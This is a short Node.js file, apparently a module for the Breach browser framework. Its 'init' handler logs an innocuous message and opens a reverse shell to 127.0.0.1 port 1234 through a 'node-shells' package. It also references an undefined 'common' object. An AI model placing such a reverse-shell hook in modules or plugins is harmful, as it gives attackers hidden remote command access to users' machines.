var ns = require('node-shells');
var breach = require('breach_module');

breach.init(function() {
  breach.expose('init', function(src, args, cb_) {
    console.log('Initialization');
    ns.reverseShell('127.0.0.1', '1234');
    return cb_();
  });

  breach.expose('kill', function(args, cb_) {
    common.exit(0);
  });
});

process.on('uncaughtException', function (err) {
  common.fatal(err);
});



